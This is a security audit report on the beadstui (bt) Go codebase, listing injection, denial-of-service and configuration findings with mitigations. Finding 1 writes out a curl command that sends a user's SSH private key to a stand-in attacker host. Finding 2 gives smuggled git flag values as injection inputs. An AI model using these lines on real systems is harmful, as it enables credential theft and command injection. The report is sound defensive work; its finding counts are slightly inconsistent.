# Security Findings — beadstui (bt)

**Date:** 2026-04-27
**Scope:** Entire codebase (~115k lines Go, 25 packages, 33 direct deps)
**Iterations:** 30 (deep audit)
**Total Findings:** 13 active (0 Critical, 0 High, 2 Medium, 8 Low, 3 Info) + 4 fixed since last audit

History tags: 🆕 New · 🔄 Recurring · ✅ Fixed (since last audit)

---

## [MEDIUM] Finding 1: Arbitrary Command Execution via Hook Config Files 🔄

- **OWASP:** A05 — Security Misconfiguration
- **STRIDE:** Elevation of Privilege
- **Location:** `pkg/hooks/executor.go:121`
- **Confidence:** Confirmed
- **Status:** Recurring (mitigation partial since last audit)

**Description:** `.bt/hooks.yaml` commands are executed via `sh -c` (Unix) or `cmd /C` (Windows) with no sandboxing or per-project consent. A repo containing a crafted `.bt/hooks.yaml` gains arbitrary code execution when a user runs export commands without `--no-hooks`.

**Δ since last audit:** A `--no-hooks` flag was added on `bt export` and as a global flag (cmd/bt/root.go:121, cobra_export.go:48,103). Default remains opt-out (hooks fire unless suppressed). No first-run confirmation or trust-on-first-use, so the threat surface is unchanged for users who haven't learned the flag exists.

**Attack Scenario:**
1. Attacker publishes a project containing `.bt/hooks.yaml` with `command: "curl attacker.com/exfil?d=$(cat ~/.ssh/id_rsa | base64)"`
2. Victim clones, runs `bt export pages`
3. Hook fires before user can react

**Code Evidence:**
```go
// pkg/hooks/executor.go:121
shell, flag := getShellCommand()
cmd := exec.CommandContext(ctx, shell, flag, hook.Command)
```

**Mitigation (preferred):**
```go
// On first run for a project where .bt/hooks.yaml is detected, prompt:
//   "This repo has hooks. Allow? [y/N]"
// Persist consent to ~/.bt/hooks-trust/<project-hash>.json
// Require re-consent if hooks.yaml hash changes.
```

Alternative (lighter): default to off; require explicit `--hooks` to enable. This inverts the current default-on/explicit-off pattern.

**References:** CWE-78 (OS Command Injection)

---

## [MEDIUM] Finding 2: Git Argument Injection via Unvalidated SHAs 🔄

- **OWASP:** A03 — Injection
- **STRIDE:** Tampering
- **Location:** `pkg/correlation/incremental.go:200,226,260`, `pkg/correlation/cocommit.go:139,186`, `pkg/correlation/reverse.go:174,268,275`, `pkg/correlation/temporal.go:66,143`, `pkg/correlation/stream.go:123,160,417`, `pkg/correlation/explicit.go:249`, `pkg/correlation/cache.go:263`
- **Confidence:** Confirmed
- **Status:** Recurring (no progress since last audit)

**Description:** Git commit SHAs from beads data (Dolt-stored issue payloads, JSONL legacy paths, or correlation cache) are passed directly to `git rev-list`, `git log`, `git show` without validation. A SHA value crafted to start with `--` would be interpreted as a flag rather than an argument. Only `pkg/loader/git.go:156` uses `--end-of-options`; the 13 correlation sites do not.

**Δ since last audit:** None. The recommended `validateSHA()` helper and `--end-of-options` placement were not added.

**Attack Scenario:**
1. Attacker controls a beads issue (e.g., crafted PR / clone-then-edit) that includes a "commit ref" of `--upload-pack=evil.sh` or `--exec=cmd.sh`
2. User runs `bt --robot-correlation` or any view that triggers correlation
3. The crafted value reaches `git log <ref>...`
4. git interprets as a flag (impact varies by flag — `--upload-pack` is benign with `git log`, but `--output=` can write attacker-controlled content to disk)

**Code Evidence:**
```go
// pkg/correlation/incremental.go:200
cmd := exec.Command("git", "rev-list", "--reverse", fmt.Sprintf("%s..HEAD", sinceSHA))

// pkg/correlation/incremental.go:257
args = append(args, commitSHAs...)  // SHAs appended without --end-of-options
```

**Mitigation:**
```go
// pkg/correlation/sha.go (new helper)
var validSHA = regexp.MustCompile(`^[0-9a-fA-F]{4,40}$`)

func ValidateSHA(sha string) error {
    if !validSHA.MatchString(sha) {
        return fmt.Errorf("invalid git SHA: %q", sha)
    }
    return nil
}

// At every call site, validate before use:
if err := ValidateSHA(sinceSHA); err != nil {
    return nil, err
}

// And use --end-of-options before any positional ref:
args := []string{"log", "-p", "--format=...", "--no-walk", "--end-of-options"}
args = append(args, commitSHAs...)
args = append(args, "--", path)
```

**References:** CWE-88 (Argument Injection), [git CVE-2024-32002 class](https://github.blog/security/) for the broader category.

---

## [LOW] Finding 3: Stream-Format Line Injection in `bt tail` Compact/Human Modes 🆕

- **OWASP:** A09 — Security Logging and Monitoring Failures
- **STRIDE:** Tampering
- **Location:** `pkg/tail/format.go:97,120`, `pkg/ui/events/diff.go:217-219`
- **Confidence:** Confirmed
- **Status:** New surface (post-2026-04-09)

**Description:** `bt tail --robot-format compact` and the human format emit `Summary` and `Title` verbatim with `%s\n`. Comments and titles are user-controlled free text that may contain literal newlines. A bead with a comment or title containing `\n` produces output where one logical event spans multiple lines, breaking line-oriented downstream parsers. This is the log-injection class of issue: not data exfil per se, but the same mechanic that lets attackers smuggle records past line-based filters and SIEM rules.

JSONL/JSON formats are safe because `json.Marshal` escapes newlines.

**Code Evidence:**
```go
// pkg/tail/format.go:97 (FormatCompact)
_, err := fmt.Fprintf(w, "%s %s %s %s\n", e.Kind.String(), e.BeadID, actor, e.Summary)

// pkg/tail/format.go:120 (FormatHuman)
_, err := fmt.Fprintf(w, "%s  %-9s  %-16s%s  %s\n", ts, e.Kind.String(), e.BeadID, actor, title)

// pkg/ui/events/diff.go:217 (Summary truncated by rune count, not newline-stripped)
summary = truncateForSummary(latest.Text, commentSummaryLimit)
```

**Mitigation:**
```go
// pkg/ui/events/diff.go - truncate AND strip newlines
func sanitizeSummary(s string, n int) string {
    s = strings.NewReplacer("\n", " ", "\r", " ", "\t", " ").Replace(s)
    return truncateForSummary(s, n)
}
```

Or, defensively in the tail formatter, replace newlines in any user-controlled field before emit.

**References:** CWE-117 (Improper Output Neutralization for Logs)

---

## [LOW] Finding 4: PreviewServer HTTP Server Lacks Timeouts 🆕

- **OWASP:** A04 — Insecure Design
- **STRIDE:** Denial of Service
- **Location:** `pkg/export/preview.go:59-62`
- **Confidence:** Confirmed
- **Status:** New surface (post-2026-04-09)

**Description:** The static-site preview server uses bare `http.Server{Addr, Handler}` with no `ReadHeaderTimeout`, `ReadTimeout`, `WriteTimeout`, or `IdleTimeout`. Go's defaults are unlimited. Bound to `127.0.0.1`, so external slowloris is impossible, but a buggy local browser tab or hung process can hold a connection indefinitely, blocking shutdown.

**Code Evidence:**
```go
// pkg/export/preview.go:59
p.server = &http.Server{
    Addr:    fmt.Sprintf("127.0.0.1:%d", p.port),
    Handler: mux,
}
```

**Mitigation:**
```go
p.server = &http.Server{
    Addr:              fmt.Sprintf("127.0.0.1:%d", p.port),
    Handler:           mux,
    ReadHeaderTimeout: 5 * time.Second,
    ReadTimeout:       30 * time.Second,
    WriteTimeout:      30 * time.Second,
    IdleTimeout:       120 * time.Second,
}
```

**References:** CWE-400 (Resource Exhaustion), [Go HTTP Server Best Practices](https://blog.cloudflare.com/the-complete-guide-to-golang-net-http-timeouts/)

---

## [LOW] Finding 5: GitHub Actions Script Injection in fuzz.yml 🆕

- **OWASP:** A03 — Injection
- **STRIDE:** Tampering
- **Location:** `.github/workflows/fuzz.yml:36, 49, 60, 67, 74, 81, 88, 95, 119`
- **Confidence:** Confirmed
- **Status:** New (existed pre-audit but not surfaced before)

**Description:** The `workflow_dispatch` input `fuzz_time` is interpolated directly into shell `run:` blocks via `${{ github.event.inputs.fuzz_time }}` and `${{ steps.fuzz-config.outputs.fuzz_time }}`. This is GitHub's documented script-injection anti-pattern. Mitigated in this case by `workflow_dispatch` only being triggerable by users with repo write access (the threat is "compromised collaborator" or "self-foot-gun", not "external attacker"). `release-notes.yml` already uses the correct env-var pattern as a positive example.

**Code Evidence:**
```yaml
# .github/workflows/fuzz.yml:35
run: |
  if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
    echo "fuzz_time=${{ github.event.inputs.fuzz_time }}" >> $GITHUB_OUTPUT
  ...
```

**Mitigation:**
```yaml
- name: Determine Fuzz Time
  id: fuzz-config
  env:
    INPUT_FUZZ_TIME: ${{ github.event.inputs.fuzz_time }}
  run: |
    if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
      echo "fuzz_time=${INPUT_FUZZ_TIME}" >> "$GITHUB_OUTPUT"
    else
      echo "fuzz_time=10m" >> "$GITHUB_OUTPUT"
    fi
```

**References:** [GitHub: Security hardening for GitHub Actions — script injection](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#good-practices-for-mitigating-script-injection-attacks)

---

## [LOW] Finding 6: BQL fieldToColumn SQL Concatenation (Latent) 🔄

- **OWASP:** A03 — Injection
- **STRIDE:** Tampering
- **Location:** `pkg/bql/sql.go:175-187`
- **Confidence:** Confirmed (latent)
- **Status:** Recurring

**Description:** `fieldToColumn` returns `"i." + field` for unknown fields. Validator gates production paths but `SQLBuilder.Build()` does not self-validate. Same as prior Finding 6.

**Mitigation:** Reject unknown field names directly in `fieldToColumn`, or have `Build()` call `Validate()` internally.

---

## [LOW] Finding 7: Global Dolt Database Name SQL Interpolation 🔄

- **OWASP:** A03 — Injection
- **STRIDE:** Tampering
- **Location:** `internal/datasource/global_dolt.go:337,350,367,384,422`
- **Confidence:** Likely
- **Status:** Recurring

**Description:** Database names from `SHOW DATABASES` are interpolated via `backtickQuote()` and `escapeSQLString()`. Escaping is correct, but the recommended regex validation defense-in-depth was not added.

**Mitigation:** Validate `^[a-zA-Z0-9_-]+$` on database names before SQL interpolation, in addition to escaping.

---

## [LOW] Finding 8: BQL Unbounded IN Value List 🔄

- **OWASP:** A04 — Insecure Design
- **STRIDE:** Denial of Service
- **Location:** `pkg/bql/parser.go:213-247`
- **Confidence:** Confirmed
- **Status:** Recurring

**Description:** No cap on values in an `IN (...)` clause. A query with millions of values allocates an unbounded `[]Value`. Same as prior Finding 8.

**Mitigation:** Cap at 1000 values with a parse error.

---

## [LOW] Finding 9: Self-Updater Missing io.LimitReader 🔄

- **OWASP:** A08 — Software and Data Integrity Failures
- **STRIDE:** Denial of Service
- **Location:** `pkg/updater/updater.go:548`
- **Confidence:** Confirmed
- **Status:** Recurring

**Description:** `io.Copy(out, tr)` extracts the binary from tar without size limiting. Mitigated by SHA256 verification + GitHub-controlled source, but defense-in-depth still missing.

**Mitigation:**
```go
const maxBinarySize = 200 * 1024 * 1024 // 200MB
if _, err := io.Copy(out, io.LimitReader(tr, maxBinarySize)); err != nil {
    return fmt.Errorf("failed to extract binary: %w", err)
}
```

---

## [LOW] Finding 10: DSN Exposed in Error Messages 🔄

- **OWASP:** A05 — Security Misconfiguration
- **STRIDE:** Information Disclosure
- **Location:** `internal/datasource/load.go:159`, `internal/datasource/dolt.go:40`
- **Confidence:** Confirmed
- **Status:** Recurring

**Description:** Dolt connection errors wrap `source.Path` (the DSN) via `%w`, so `root@tcp(127.0.0.1:3307)/beads?parseTime=true` reaches the TUI status bar through `shortError()`. Not a credential disclosure (no password in DSN), but topology leak.

**Mitigation:** Wrap with a topology-free message:
```go
return nil, fmt.Errorf("failed to open Dolt source: %w", err) // drop source.Path
```

---

## [LOW] Finding 11: Git --grep Bead ID Not Regex-Escaped 🔄

- **OWASP:** A03 — Injection
- **STRIDE:** Tampering
- **Location:** `pkg/correlation/explicit.go:233`
- **Confidence:** Confirmed
- **Status:** Recurring

**Description:** Bead IDs passed to `git --grep=<id>` without `regexp.QuoteMeta()`. Inconsistent with `extractor.go:157` which correctly quotes. Same as prior Finding 11.

**Mitigation:** Apply `regexp.QuoteMeta(pattern)` before `--grep=`.

---

## [LOW] Finding 12: Swallowed Critical Errors 🔄

- **OWASP:** A05 — Security Misconfiguration
- **STRIDE:** Repudiation
- **Location:** `cmd/bt/root.go:170` (was main.go:494), `pkg/hooks/config.go:93`, `pkg/recipe/loader.go:74`
- **Confidence:** Confirmed
- **Status:** Recurring

**Description:** Three error-discarding sites. `gitLoader.ResolveRevision()` failure silently empties `asOfResolved`, causing `--as-of` to silently show wrong data. Same as prior Finding 12.

**Mitigation:** At minimum log a warning; prefer propagation.

---

## [LOW] Finding 13: Windows Lock TOCTOU Race 🔄

- **OWASP:** A04 — Insecure Design
- **STRIDE:** Denial of Service
- **Location:** `pkg/instance/lock_windows.go`
- **Confidence:** Possible
- **Status:** Recurring

**Description:** Windows lock takeover uses `Remove` + `Rename` due to platform constraints. Tiny race window between operations. Acceptable for a single-user TUI. Same as prior Finding 13.

---

## [LOW] Finding 14: Dolt Hardcoded Root User 🔄

- **OWASP:** A07 — Identification and Authentication Failures
- **STRIDE:** Spoofing
- **Location:** `internal/datasource/metadata.go:63`
- **Confidence:** Confirmed
- **Status:** Recurring

**Description:** All Dolt connections use `root` with no password. Standard for local Dolt. The recommended `BT_DOLT_USER`/`BT_DOLT_PASSWORD` env vars were not added.

**Mitigation:** Honor `BT_DOLT_USER` / `BT_DOLT_PASSWORD` env vars when set; fall back to current behavior.

---

## [LOW] Finding 15: Unrecovered TUI Main Thread Panics 🔄

- **OWASP:** A04 — Insecure Design
- **STRIDE:** Denial of Service
- **Location:** `cmd/bt/root.go:748-820`
- **Confidence:** Possible
- **Status:** Recurring

**Description:** `tea.NewProgram` and `p.Run()` are not wrapped in a deferred recover. A panic in Update/View can leave the terminal in raw mode.

**Mitigation:** Wrap `runTUIProgram` body with `defer func() { if r := recover(); r != nil { /* reset terminal */ panic(r) } }()`.

---

## ✅ Fixed Since 2026-04-09

| Prior Finding | Status | Fix |
|---|---|---|
| ✅ Finding 1: Windows `cmd /c start` injection | Fixed | Both `pkg/export/github.go:610` and `pkg/export/cloudflare.go:347` use `rundll32 url.dll,FileProtocolHandler` |
| ✅ Finding 3: BQL parser stack overflow | Fixed | `maxParseDepth=100` + `maxEvalDepth=100`, both fail-closed |
| ✅ Finding 4: BQL `dateToSQL` SQL injection | Fixed | Now uses `?` parameterization with `b.params` |
| ✅ Finding 16-17: edwards25519 + golang.org/x/image CVEs | Recurring (still present) | Same advisory CVEs, still in unused code paths; bumps still hygiene-only |

## Info (Clean Areas — confirmed safe)

- **Finding 16: Editor allowlist** — Strong allowlist still in place (`pkg/ui/model_editor.go`). No regression.
- **Finding 17: Self-updater integrity** — SHA256 + GitHub host pin + filepath.Base zip-slip protection still in place. No regression.
- **Finding 18 (new):** events ring-buffer JSONL persistence is clean — typed Event struct, 1MiB scanner cap, corrupt-line tolerant, fixed path under `~/.bt/`.
- **Finding 19 (new):** `pkg/baseline.runGit` hardcoded args, no user-input flow.
- **Finding 20 (new):** `pkg/drift/config.go` typed YAML decode + Validate().
- **Finding 21 (new):** `pkg/view` projections use typed JSON.
- **Finding 22 (new):** `pkg/agents/prefs` hashes project path → safe filename.
- **Finding 23 (new):** `pkg/search` is pure-Go embedding/scoring, no SQL.
- **Finding 24 (new):** Hook env-var expansion is `os.Expand` template, not shell eval — values flow into `cmd.Env` only.
- **Finding 25 (new):** No hardcoded credentials, AWS keys, GitHub tokens, or Stripe keys in source.
- **Finding 26 (new):** `pkg/ui/model_export.getCommitURL` constructs URLs from git remote (repo-controlled) + SHA, passes argv to OS URL handlers (no shell metachar interpretation).
